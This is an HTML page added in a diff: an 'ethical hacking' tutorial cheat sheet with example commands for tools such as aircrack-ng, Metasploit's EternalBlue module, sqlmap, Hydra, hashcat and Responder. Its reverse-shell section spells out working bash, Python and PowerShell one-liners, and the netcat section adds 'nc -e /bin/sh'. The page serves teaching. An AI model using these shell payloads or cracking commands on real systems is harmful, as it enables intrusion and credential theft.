@@ -1,0 +1,803 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Learn Hacking - ALEXANDER</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .learn-hero {
+            background: linear-gradient(135deg, var(--primary-color) 0%, var(--accent-color) 100%);
+            color: var(--text-light);
+            padding: 80px 20px;
+            text-align: center;
+            margin-top: 60px;
+        }
+
+        .back-link {
+            display: inline-block;
+            margin-bottom: 2rem;
+            color: var(--secondary-color);
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .back-link:hover {
+            text-decoration: underline;
+        }
+
+        .topic-section {
+            background: var(--text-light);
+            border-radius: var(--border-radius);
+            padding: 2rem;
+            margin-bottom: 2rem;
+            border-left: 5px solid var(--secondary-color);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            transition: var(--transition);
+            animation: fadeInUp 0.8s ease-out;
+        }
+
+        .topic-section:hover {
+            transform: translateX(5px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
+        }
+
+        .topic-section h3 {
+            color: var(--primary-color);
+            margin-bottom: 1rem;
+            font-size: 1.3rem;
+            display: flex;
+            align-items: center;
+            gap: 0.7rem;
+        }
+
+        .topic-section i {
+            font-size: 1.8rem;
+        }
+
+        .topic-content {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+            margin-top: 1.5rem;
+        }
+
+        .topic-text {
+            line-height: 1.6;
+        }
+
+        .topic-commands {
+            background: var(--bg-light);
+            padding: 1rem;
+            border-radius: 6px;
+            border: 1px solid #ddd;
+        }
+
+        .topic-commands h4 {
+            color: var(--accent-color);
+            margin-bottom: 0.5rem;
+        }
+
+        .topic-commands code {
+            display: block;
+            background: rgba(0, 0, 0, 0.05);
+            padding: 0.5rem;
+            border-radius: 4px;
+            margin-bottom: 0.5rem;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+        }
+
+        .apply-section {
+            background: linear-gradient(135deg, var(--secondary-color) 0%, #ff6b9d 100%);
+            color: var(--text-light);
+            padding: 3rem 2rem;
+            border-radius: var(--border-radius);
+            margin: 3rem 0;
+            text-align: center;
+            animation: pulse 2s infinite;
+        }
+
+        .apply-section h3 {
+            font-size: 2rem;
+            margin-bottom: 1rem;
+        }
+
+        .apply-section p {
+            font-size: 1.1rem;
+            margin-bottom: 2rem;
+        }
+
+        .apply-btn {
+            display: inline-block;
+            background: var(--text-light);
+            color: var(--secondary-color);
+            padding: 1rem 2rem;
+            border-radius: var(--border-radius);
+            text-decoration: none;
+            font-weight: bold;
+            transition: var(--transition);
+            animation: bounceIn 1s ease-out;
+        }
+
+        .apply-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.02);
+            }
+        }
+
+        @keyframes bounceIn {
+            0% {
+                opacity: 0;
+                transform: scale(0.3);
+            }
+            50% {
+                opacity: 1;
+                transform: scale(1.05);
+            }
+            70% {
+                transform: scale(0.9);
+            }
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        /* Dark Mode Overrides */
+        :root[data-theme="dark"] .topic-section {
+            background: linear-gradient(135deg, #0a0e27 0%, #1a1a3e 100%);
+            border-left-color: var(--neon-purple);
+        }
+
+        :root[data-theme="dark"] .topic-section h3 {
+            color: var(--text-light);
+        }
+
+        :root[data-theme="dark"] .topic-text p {
+            color: var(--text-light);
+        }
+
+        :root[data-theme="dark"] .topic-commands {
+            background: var(--bg-light);
+            border-color: var(--neon-purple);
+        }
+
+        :root[data-theme="dark"] .topic-commands code {
+            background: rgba(255, 255, 255, 0.08);
+            color: #e3f2fd;
+        }
+
+        :root[data-theme="dark"] .apply-section {
+            background: linear-gradient(135deg, var(--secondary-color) 0%, var(--accent-color) 100%);
+        }
+    </style>
+</head>
+<body>
+    <!-- Navigation -->
+    <nav class="navbar">
+        <div class="container">
+            <div class="logo">ALEXANDER</div>
+            <ul class="nav-menu">
+                <li><a href="index.html#home">Home</a></li>
+                <li><a href="index.html#about">About</a></li>
+                <li><a href="index.html#skills">Skills</a></li>
+                <li><a href="programming.html">Programming</a></li>
+                <li><a href="hacking.html">Hacking</a></li>
+                <li><a href="learn-hacking.html">Learn Hacking</a></li>
+                <li><a href="index.html#contact">Contact</a></li>
+            </ul>
+            <button class="mobile-menu-toggle" aria-label="Toggle navigation menu" aria-expanded="false">
+                <i class="fas fa-bars"></i>
+            </button>
+            <button class="theme-toggle" title="Toggle Dark Mode">
+                <i class="fas fa-moon"></i>
+            </button>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section class="learn-hero">
+        <div class="container">
+            <a href="index.html" class="back-link">← Back to Home</a>
+            <h1>Learn Ethical Hacking</h1>
+            <p class="subtitle">Master Cybersecurity Skills | Educational Resources & Tutorials</p>
+        </div>
+    </section>
+
+    <!-- Disclaimer -->
+    <section style="padding: 20px;">
+        <div class="container">
+            <div class="disclaimer">
+                <strong><i class="fas fa-exclamation-triangle"></i> Legal Disclaimer:</strong> All hacking knowledge shared here is intended for 
+                <strong>educational purposes and authorized security testing only</strong>. Unauthorized access to computer systems is illegal. 
+                These techniques should only be used on systems you own or have explicit written permission to test.
+            </div>
+        </div>
+    </section>
+
+    <!-- Main Content -->
+    <section style="padding: 80px 20px;">
+        <div class="container">
+            <h2 style="margin-bottom: 3rem; text-align: center; color: var(--primary-color);">
+                Hacking Topics & Tutorials
+                <div style="width: 60px; height: 4px; background-color: var(--secondary-color); border-radius: 2px; margin: 1rem auto 0;"></div>
+            </h2>
+
+            <!-- WIFI HACKING -->
+            <div class="topic-section">
+                <h3><i class="fas fa-wifi" style="color: #0f3460;"></i>WiFi Hacking</h3>
+                <div class="topic-content">
+                    <div class="topic-text">
+                        <p>Learn wireless network security, including WPA/WPA2/WPA3 cracking, deauthentication attacks, and rogue access point detection. Understand the fundamentals of wireless security protocols and common vulnerabilities.</p>
+                        <p>Key concepts: Handshake capture, dictionary attacks, PMKID attacks, and wireless reconnaissance.</p>
+                    </div>
+                    <div class="topic-commands">
+                        <h4>Basic Commands</h4>
+                        <code>iwconfig</code>
+                        <code>airmon-ng start wlan0</code>
+                        <code>airodump-ng mon0</code>
+                        <code>airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w capture mon0</code>
+                        <code>aireplay-ng --deauth 10 -a XX:XX:XX:XX:XX:XX mon0</code>
+                        <code>aircrack-ng -w wordlist.txt capture-01.cap</code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- METASPLOIT -->
+            <div class="topic-section">
+                <h3><i class="fas fa-bug" style="color: #e94560;"></i>Metasploit Framework</h3>
+                <div class="topic-content">
+                    <div class="topic-text">
+                        <p>Master the world's most popular penetration testing framework. Learn module usage, payload generation, exploit development, and post-exploitation techniques for authorized security assessments.</p>
+                        <p>Covers: Auxiliary modules, exploits, payloads, encoders, and Meterpreter for advanced post-exploitation.</p>
+                    </div>
+                    <div class="topic-commands">
+                        <h4>Essential Commands</h4>
+                        <code>msfconsole</code>
+                        <code>search eternalblue</code>
+                        <code>use exploit/windows/smb/ms17_010_eternalblue</code>
+                        <code>show options</code>
+                        <code>set RHOSTS 192.168.1.100</code>
+                        <code>exploit</code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- WIRESHARK -->
+            <div class="topic-section">
+                <h3><i class="fas fa-network-wired" style="color: #ff6b9d;"></i>Wireshark</h3>
+                <div class="topic-content">
+                    <div class="topic-text">
+                        <p>Become proficient in network protocol analysis using Wireshark. Learn packet capture, filtering, analysis of common protocols (HTTP, DNS, TCP/IP), and identifying security issues in network traffic.</p>
+                        <p>Topics: Display filters, capture filters, protocol dissection, and traffic analysis for troubleshooting and security auditing.</p>
+                    </div>
+                    <div class="topic-commands">
+                        <h4>Usage Examples</h4>
+                        <code>wireshark</code>
+                        <code>tshark -i eth0 -w capture.pcap</code>
+                        <code>wireshark capture.pcap</code>
+                        <code>tcpdump -i eth0 -w capture.pcap</code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- FEROBUSTER -->
+            <div class="topic-section">
+                <h3><i class="fas fa-search" style="color: #ffc107;"></i>Ferobuster (Directory Busting)</h3>
+                <div class="topic-content">
+                    <div class="topic-text">
+                        <p>Learn directory and file enumeration techniques using Ferobuster. Discover hidden directories, files, and endpoints on web servers through brute-force and dictionary-based attacks.</p>
+                        <p>Covers: Wordlist selection, extension testing, recursive scanning, and filtering techniques for efficient enumeration.</p>
+                    </div>
+                    <div class="topic-commands">
+                        <h4>Basic Usage</h4>
+                        <code>feroxbuster -u http://example.com -w /path/to/wordlist.txt</code>
+                        <code>feroxbuster -u http://example.com -w wordlist.txt -x php,txt,html</code>
+                        <code>feroxbuster -u http://example.com -w wordlist.txt --recursive</code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- FERNET -->
+            <div class="topic-section">
+                <h3><i class="fas fa-lock" style="color: #28a745;"></i>Fernet (Cryptography)</h3>
+                <div class="topic-content">
+                    <div class="topic-text">
+                        <p>Master symmetric encryption using Python's Fernet library. Learn secure key generation, encryption/decryption of data, and implementing cryptography in applications for data protection.</p>
+                        <p>Topics: Key management, token generation, secure communication, and cryptographic best practices.</p>
+                    </div>
+                    <div class="topic-commands">
+                        <h4>Python Examples</h4>
+                        <code>from cryptography.fernet import Fernet</code>
+                        <code>key = Fernet.generate_key()</code>
+                        <code>cipher = Fernet(key)</code>
+                        <code>encrypted = cipher.encrypt(b"secret message")</code>
+                        <code>decrypted = cipher.decrypt(encrypted)</code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- TC (Traffic Control) -->
+            <div class="topic-section">
+                <h3><i class="fas fa-traffic-light" style="color: #17a2b8;"></i>TC (Traffic Control)</h3>
+                <div class="topic-content">
+                    <div class="topic-text">
+                        <p>Learn Linux Traffic Control (tc) for network shaping, QoS, and bandwidth management. Understand queuing disciplines, filters, and advanced networking configurations for system administration and security testing.</p>
+                        <p>Covers: Bandwidth limiting, traffic prioritization, delay simulation, and network testing scenarios.</p>
+                    </div>
+                    <div class="topic-commands">
+                        <h4>Essential Commands</h4>
+                        <code>tc qdisc add dev eth0 root netem delay 100ms</code>
+                        <code>tc qdisc add dev eth0 root tbf rate 1mbit burst 32kbit latency 400ms</code>
+                        <code>tc qdisc show dev eth0</code>
+                        <code>tc qdisc del dev eth0 root</code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- NMAP -->
+            <div class="topic-section">
+                <h3><i class="fas fa-search-plus" style="color: #28a745;"></i>Nmap (Network Mapper)</h3>
+                <div class="topic-content">
+                    <div class="topic-text">
+                        <p>Master the essential network scanning tool for discovering hosts, services, and vulnerabilities. Learn port scanning, service detection, OS fingerprinting, and script-based vulnerability assessment.</p>
+                        <p>Key features: Host discovery, port scanning, version detection, OS detection, and NSE scripts for advanced scanning.</p>
+                    </div>
+                    <div class="topic-commands">
+                        <h4>Basic Commands</h4>
+                        <code>nmap -sn 192.168.1.0/24</code>
+                        <code>nmap -sV -O 192.168.1.100</code>
+                        <code>nmap -p 1-65535 --open 192.168.1.100</code>
+                        <code>nmap --script vuln 192.168.1.100</code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- BURP SUITE -->
+            <div class="topic-section">
+                <h3><i class="fas fa-spider" style="color: #ffc107;"></i>Burp Suite</h3>
+                <div class="topic-content">
+                    <div class="topic-text">
+                        <p>Learn web application security testing with Burp Suite. Master intercepting proxy, scanner, intruder, repeater, and decoder tools for comprehensive web vulnerability assessment.</p>
+                        <p>Covers: Proxy interception, automated scanning, manual testing, session handling, and extension development.</p>
+                    </div>
+                    <div class="topic-commands">
+                        <h4>Usage</h4>
+                        <code>burpsuite</code>
+                        <code>burpsuite --headless --scan-url=http://example.com</code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- SQLMAP -->
+            <div class="topic-section">
+                <h3><i class="fas fa-database" style="color: #dc3545;"></i>SQLMap</h3>
+                <div class="topic-content">
+                    <div class="topic-text">
+                        <p>Automate SQL injection detection and exploitation. Learn database fingerprinting, data extraction, privilege escalation, and file system access through SQL injection vulnerabilities.</p>
+                        <p>Features: Database enumeration, data dumping, shell access, and advanced injection techniques.</p>
+                    </div>
+                    <div class="topic-commands">
+                        <h4>Basic Commands</h4>
+                        <code>sqlmap -u "http://example.com?id=1" --dbs</code>
+                        <code>sqlmap -u "http://example.com?id=1" -D database --tables</code>
+                        <code>sqlmap -u "http://example.com?id=1" -D database -T table --dump</code>
+                        <code>sqlmap -u "http://example.com?id=1" --os-shell</code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- HASHCAT -->
+            <div class="topic-section">
+                <h3><i class="fas fa-key" style="color: #6f42c1;"></i>Hashcat</h3>
+                <div class="topic-content">
+                    <div class="topic-text">
+                        <p>Advanced password cracking tool supporting multiple hash types and attack modes. Learn dictionary attacks, brute force, mask attacks, and GPU-accelerated cracking techniques.</p>
+                        <p>Supports: MD5, SHA, NTLM, WPA, and thousands of other hash formats with optimized algorithms.</p>
+                    </div>
+                    <div class="topic-commands">
+                        <h4>Basic Commands</h4>
+                        <code>hashcat -m 0 -a 0 hashes.txt wordlist.txt</code>
+                        <code>hashcat -m 1000 -a 3 ntlm_hashes.txt ?a?a?a?a?a?a</code>
+                        <code>hashcat -m 2500 -a 0 wpa_handshake.hccapx wordlist.txt</code>
+                        <code>hashcat --show hashes.txt</code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- HYDRA -->
+            <div class="topic-section">
+                <h3><i class="fas fa-unlock" style="color: #17a2b8;"></i>Hydra</h3>
+                <div class="topic-content">
+                    <div class="topic-text">
+                        <p>Fast network logon cracker supporting numerous protocols. Learn brute force and dictionary attacks against login systems, including SSH, FTP, HTTP, and database services.</p>
+                        <p>Features: Parallel connections, different attack modes, and support for custom modules.</p>
+                    </div>
+                    <div class="topic-commands">
+                        <h4>Basic Commands</h4>
+                        <code>hydra -l admin -P passwords.txt ssh://192.168.1.100</code>
+                        <code>hydra -L users.txt -P pass.txt ftp://192.168.1.100</code>
+                        <code>hydra -l admin -P rockyou.txt http-post-form "/login:username=^USER^&password=^PASS^:Invalid"</code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- NIKTO -->
+            <div class="topic-section">
+                <h3><i class="fas fa-shield-alt" style="color: #e94560;"></i>Nikto</h3>
+                <div class="topic-content">
+                    <div class="topic-text">
+                        <p>Web server scanner that performs comprehensive tests against web servers for multiple items. Detect outdated software, configuration issues, and potential security vulnerabilities.</p>
+                        <p>Covers: Server configuration, outdated components, and common web server vulnerabilities.</p>
+                    </div>
+                    <div class="topic-commands">
+                        <h4>Basic Commands</h4>
+                        <code>nikto -h http://example.com</code>
+                        <code>nikto -h https://example.com -ssl</code>
+                        <code>nikto -h 192.168.1.100 -p 8080</code>
+                        <code>nikto -h example.com -Tuning x</code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- VOLATILITY -->
+            <div class="topic-section">
+                <h3><i class="fas fa-memory" style="color: #0f3460;"></i>Volatility</h3>
+                <div class="topic-content">
+                    <div class="topic-text">
+                        <p>Advanced memory forensics framework for analyzing RAM dumps. Extract processes, network connections, passwords, and malware from memory images for incident response and malware analysis.</p>
+                        <p>Features: Process analysis, network artifacts, registry analysis, and plugin-based architecture.</p>
+                    </div>
+                    <div class="topic-commands">
+                        <h4>Basic Commands</h4>
+                        <code>volatility -f memory.dmp imageinfo</code>
+                        <code>volatility -f memory.dmp --profile=Win7SP1x64 pslist</code>
+                        <code>volatility -f memory.dmp --profile=Win7SP1x64 netscan</code>
+                        <code>volatility -f memory.dmp --profile=Win7SP1x64 hashdump</code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- JOHN THE RIPPER -->
+            <div class="topic-section">
+                <h3><i class="fas fa-lock-open" style="color: #28a745;"></i>John the Ripper</h3>
+                <div class="topic-content">
+                    <div class="topic-text">
+                        <p>Powerful password cracking tool supporting multiple hash types and attack modes. Learn dictionary attacks, brute force, and incremental modes for password recovery and security testing.</p>
+                        <p>Features: Support for hundreds of hash types, optimized for CPU cracking, and extensive customization options.</p>
+                    </div>
+                    <div class="topic-commands">
+                        <h4>Basic Commands</h4>
+                        <code>john hashes.txt</code>
+                        <code>john --wordlist=rockyou.txt hashes.txt</code>
+                        <code>john --incremental hashes.txt</code>
+                        <code>john --show hashes.txt</code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- GOBUSTER -->
+            <div class="topic-section">
+                <h3><i class="fas fa-folder-open" style="color: #ffc107;"></i>Gobuster</h3>
+                <div class="topic-content">
+                    <div class="topic-text">
+                        <p>Fast directory and file enumeration tool written in Go. Discover hidden directories, files, and endpoints on web servers through brute-force and dictionary-based attacks.</p>
+                        <p>Covers: Directory busting, DNS subdomain enumeration, virtual host discovery, and AWS S3 bucket enumeration.</p>
+                    </div>
+                    <div class="topic-commands">
+                        <h4>Basic Commands</h4>
+                        <code>gobuster dir -u http://example.com -w wordlist.txt</code>
+                        <code>gobuster dns -d example.com -w subdomains.txt</code>
+                        <code>gobuster vhost -u http://example.com -w vhosts.txt</code>
+                        <code>gobuster s3 -w bucket-names.txt</code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- OWASP ZAP -->
+            <div class="topic-section">
+                <h3><i class="fas fa-bug" style="color: #dc3545;"></i>OWASP ZAP</h3>
+                <div class="topic-content">
+                    <div class="topic-text">
+                        <p>Integrated penetration testing tool for finding vulnerabilities in web applications. Features automated scanners, intercepting proxy, and extensive add-on ecosystem.</p>
+                        <p>Covers: Active scanning, passive scanning, AJAX spidering, and API testing capabilities.</p>
+                    </div>
+                    <div class="topic-commands">
+                        <h4>Usage</h4>
+                        <code>zap.sh</code>
+                        <code>zap.sh -cmd -autorun /path/to/plan</code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- MALTEGO -->
+            <div class="topic-section">
+                <h3><i class="fas fa-project-diagram" style="color: #6f42c1;"></i>Maltego</h3>
+                <div class="topic-content">
+                    <div class="topic-text">
+                        <p>Open source intelligence and forensics application for link analysis and data mining. Visualize relationships between people, organizations, websites, and infrastructure.</p>
+                        <p>Features: Entity linking, data visualization, and integration with various data sources for comprehensive reconnaissance.</p>
+                    </div>
+                    <div class="topic-commands">
+                        <h4>Usage</h4>
+                        <code>maltego</code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- THEHARVESTER -->
+            <div class="topic-section">
+                <h3><i class="fas fa-envelope" style="color: #17a2b8;"></i>TheHarvester</h3>
+                <div class="topic-content">
+                    <div class="topic-text">
+                        <p>Intelligence gathering tool for collecting emails, names, subdomains, IPs, and URLs from public sources. Essential for reconnaissance and OSINT operations.</p>
+                        <p>Supports: Search engines, PGP key servers, SHODAN, and various online data sources.</p>
+                    </div>
+                    <div class="topic-commands">
+                        <h4>Basic Commands</h4>
+                        <code>theHarvester -d example.com -l 500 -b all</code>
+                        <code>theHarvester -d example.com -b google</code>
+                        <code>theHarvester -d example.com -b linkedin</code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- SOCIAL-ENGINEER TOOLKIT -->
+            <div class="topic-section">
+                <h3><i class="fas fa-user-secret" style="color: #e94560;"></i>Social-Engineer Toolkit (SET)</h3>
+                <div class="topic-content">
+                    <div class="topic-text">
+                        <p>Framework for simulating social engineering attacks. Create phishing campaigns, credential harvesting, and payload delivery systems for security awareness training.</p>
+                        <p>Features: Website cloning, credential harvesters, mass mailer attacks, and Arduino-based attack vectors.</p>
+                    </div>
+                    <div class="topic-commands">
+                        <h4>Basic Commands</h4>
+                        <code>setoolkit</code>
+                        <code>1) Social-Engineering Attacks</code>
+                        <code>2) Website Attack Vectors</code>
+                        <code>3) Credential Harvester Attack Method</code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- TELNET -->
+            <div class="topic-section">
+                <h3><i class="fas fa-terminal" style="color: #28a745;"></i>Telnet</h3>
+                <div class="topic-content">
+                    <div class="topic-text">
+                        <p>Network protocol for bidirectional interactive text-oriented communication. Used for remote login and testing network services, though insecure and often replaced by SSH.</p>
+                        <p>Features: Plain text communication, banner grabbing, service enumeration, and basic network troubleshooting.</p>
+                    </div>
+                    <div class="topic-commands">
+                        <h4>Basic Commands</h4>
+                        <code>telnet 192.168.1.100 23</code>
+                        <code>telnet example.com 80</code>
+                        <code>GET / HTTP/1.0</code>
+                        <code>HEAD / HTTP/1.0</code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- NETCAT -->
+            <div class="topic-section">
+                <h3><i class="fas fa-network-wired" style="color: #ffc107;"></i>Netcat (nc)</h3>
+                <div class="topic-content">
+                    <div class="topic-text">
+                        <p>Versatile networking utility known as the "Swiss Army knife" of networking. Used for reading/writing network connections, port scanning, file transfer, and backdoors.</p>
+                        <p>Features: Port scanning, banner grabbing, file transfer, reverse shells, and network debugging.</p>
+                    </div>
+                    <div class="topic-commands">
+                        <h4>Basic Commands</h4>
+                        <code>nc -zv 192.168.1.100 1-1000</code>
+                        <code>nc -lvp 4444</code>
+                        <code>nc 192.168.1.100 4444</code>
+                        <code>nc -e /bin/sh 192.168.1.100 4444</code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- TCPDUMP -->
+            <div class="topic-section">
+                <h3><i class="fas fa-search" style="color: #dc3545;"></i>Tcpdump</h3>
+                <div class="topic-content">
+                    <div class="topic-text">
+                        <p>Command-line packet analyzer for capturing and displaying TCP/IP packets. Essential for network troubleshooting, security analysis, and protocol debugging.</p>
+                        <p>Features: Packet filtering, protocol analysis, traffic monitoring, and capture file generation.</p>
+                    </div>
+                    <div class="topic-commands">
+                        <h4>Basic Commands</h4>
+                        <code>tcpdump -i eth0</code>
+                        <code>tcpdump -i eth0 port 80</code>
+                        <code>tcpdump -i eth0 -w capture.pcap</code>
+                        <code>tcpdump -r capture.pcap</code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- DIRB -->
+            <div class="topic-section">
+                <h3><i class="fas fa-folder" style="color: #6f42c1;"></i>Dirb</h3>
+                <div class="topic-content">
+                    <div class="topic-text">
+                        <p>Web content scanner that looks for existing and/or hidden web objects. Uses a dictionary-based attack to discover directories and files on web servers.</p>
+                        <p>Features: Recursive scanning, extension detection, code analysis, and customizable wordlists.</p>
+                    </div>
+                    <div class="topic-commands">
+                        <h4>Basic Commands</h4>
+                        <code>dirb http://example.com</code>
+                        <code>dirb http://example.com /usr/share/dirb/wordlists/common.txt</code>
+                        <code>dirb http://example.com -X .php,.txt</code>
+                        <code>dirb http://example.com -r</code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- CEWL -->
+            <div class="topic-section">
+                <h3><i class="fas fa-spell-check" style="color: #17a2b8;"></i>CeWL (Custom Word List generator)</h3>
+                <div class="topic-content">
+                    <div class="topic-text">
+                        <p>Custom wordlist generator that spiders websites and creates wordlists based on the content. Useful for creating targeted password lists from company websites.</p>
+                        <p>Features: Website crawling, word extraction, minimum word length filtering, and email harvesting.</p>
+                    </div>
+                    <div class="topic-commands">
+                        <h4>Basic Commands</h4>
+                        <code>cewl -w wordlist.txt http://example.com</code>
+                        <code>cewl -d 2 -m 5 -w wordlist.txt http://example.com</code>
+                        <code>cewl -e --email_file emails.txt http://example.com</code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ENUM4LINUX -->
+            <div class="topic-section">
+                <h3><i class="fas fa-server" style="color: #0f3460;"></i>Enum4linux</h3>
+                <div class="topic-content">
+                    <div class="topic-text">
+                        <p>Tool for enumerating information from Windows and Samba systems. Extracts user lists, machine lists, share lists, and other valuable information from SMB services.</p>
+                        <p>Features: User enumeration, group enumeration, share enumeration, and password policy checking.</p>
+                    </div>
+                    <div class="topic-commands">
+                        <h4>Basic Commands</h4>
+                        <code>enum4linux -a 192.168.1.100</code>
+                        <code>enum4linux -U 192.168.1.100</code>
+                        <code>enum4linux -S 192.168.1.100</code>
+                        <code>enum4linux -G 192.168.1.100</code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- RESPONDER -->
+            <div class="topic-section">
+                <h3><i class="fas fa-reply" style="color: #e94560;"></i>Responder</h3>
+                <div class="topic-content">
+                    <div class="topic-text">
+                        <p>LLMNR, NBT-NS and MDNS poisoner. Captures NTLM hashes from Windows systems by responding to name resolution requests in place of legitimate servers.</p>
+                        <p>Features: Hash capture, rogue server simulation, and multi-protocol poisoning for credential harvesting.</p>
+                    </div>
+                    <div class="topic-commands">
+                        <h4>Basic Commands</h4>
+                        <code>responder -I eth0</code>
+                        <code>responder -I eth0 -v</code>
+                        <code>responder -I eth0 -wrf</code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- REVERSE SHELL -->
+            <div class="topic-section">
+                <h3><i class="fas fa-terminal" style="color: #28a745;"></i>Reverse Shell Techniques</h3>
+                <div class="topic-content">
+                    <div class="topic-text">
+                        <p>Understand reverse shell payload delivery and secure testing of remote command execution. Learn the difference between bind shells, reverse shells, and how to manage connections safely during authorized assessments.</p>
+                        <p>Topics: Netcat reverse shells, Bash/Python shells, PowerShell payloads, and secure listener configuration.</p>
+                    </div>
+                    <div class="topic-commands">
+                        <h4>Example Commands</h4>
+                        <code>nc -lvnp 4444</code>
+                        <code>bash -i >& /dev/tcp/10.10.14.2/4444 0>&1</code>
+                        <code>python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("10.10.14.2",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"])'</code>
+                        <code>powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('10.10.14.2',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};</code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- GMAIL SECURITY -->
+            <div class="topic-section">
+                <h3><i class="fas fa-envelope" style="color: #ffc107;"></i>Gmail Security Research</h3>
+                <div class="topic-content">
+                    <div class="topic-text">
+                        <p>Learn how attackers target email platforms and how to defend Gmail accounts. Focus on phishing awareness, account recovery analysis, and authorized security testing of email workflows.</p>
+                        <p>Topics: Phishing simulations, email header analysis, OAuth abuse, and account protection best practices.</p>
+                    </div>
+                    <div class="topic-commands">
+                        <h4>Example Techniques</h4>
+                        <code>theHarvester -d example.com -b google</code>
+                        <code>setoolkit</code>
+                        <code>python3 -m smtpd -c DebuggingServer -n localhost:1025</code>
+                        <code>curl -I https://accounts.google.com</code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- WINDOWS HACKING -->
+            <div class="topic-section">
+                <h3><i class="fab fa-windows" style="color: #0078d7;"></i>Windows Hacking</h3>
+                <div class="topic-content">
+                    <div class="topic-text">
+                        <p>Explore Windows-based penetration testing and privilege escalation techniques. Learn about Windows internals, service enumeration, active directory enumeration, and defensive bypass strategies.</p>
+                        <p>Topics: PowerShell exploitation, SMB enumeration, user token impersonation, and WMI command execution.</p>
+                    </div>
+                    <div class="topic-commands">
+                        <h4>Essential Commands</h4>
+                        <code>whoami /priv</code>
+                        <code>systeminfo</code>
+                        <code>powershell -Command "Get-LocalUser"</code>
+                        <code>wmic service get name,displayname,state</code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Additional Topics -->
+            <div class="topic-section">
+                <h3><i class="fas fa-code" style="color: #6f42c1;"></i>Additional Topics</h3>
+                <div class="topic-content">
+                    <div class="topic-text">
+                        <p>Explore more advanced hacking concepts including SQL injection, XSS attacks, buffer overflows, reverse engineering, and malware analysis. Learn about social engineering, phishing techniques, and secure coding practices.</p>
+                        <p>Advanced areas: Web application security, binary exploitation, forensics, and incident response.</p>
+                    </div>
+                    <div class="topic-commands">
+                        <h4>Tools & Commands</h4>
+                        <code>sqlmap -u "http://example.com?id=1" --dbs</code>
+                        <code>burpsuite</code>
+                        <code>gdb ./binary</code>
+                        <code>volatility -f memory.dump imageinfo</code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Apply Now Section -->
+            <div class="apply-section">
+                <h3>Join Our Hacking Community</h3>
+                <p>Ready to dive deeper into ethical hacking? Join our exclusive WhatsApp group for discussions, tutorials, and community support.</p>
+                <a href="https://chat.whatsapp.com/Il5hLOJFYBeAwwFfSHT7kf" class="apply-btn" target="_blank">APPLY NOW TO JOIN THIS GROUP</a>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <p>&copy; 2026 ALEXANDER. All rights reserved. | Ethical Hacking Educator</p>
+            <div class="social-links">
+                <a href="https://github.com/demonalexander526-alt" target="_blank"><i class="fab fa-github"></i></a>
+                <a href="https://t.me/Vershdit" target="_blank"><i class="fab fa-telegram-plane"></i></a>
+                <a href="https://wa.me/2349054345858" target="_blank"><i class="fab fa-whatsapp"></i></a>
+            </div>
+        </div>
+    </footer>
+
+    <script src="script.js"></script>
+</body>
+</html>
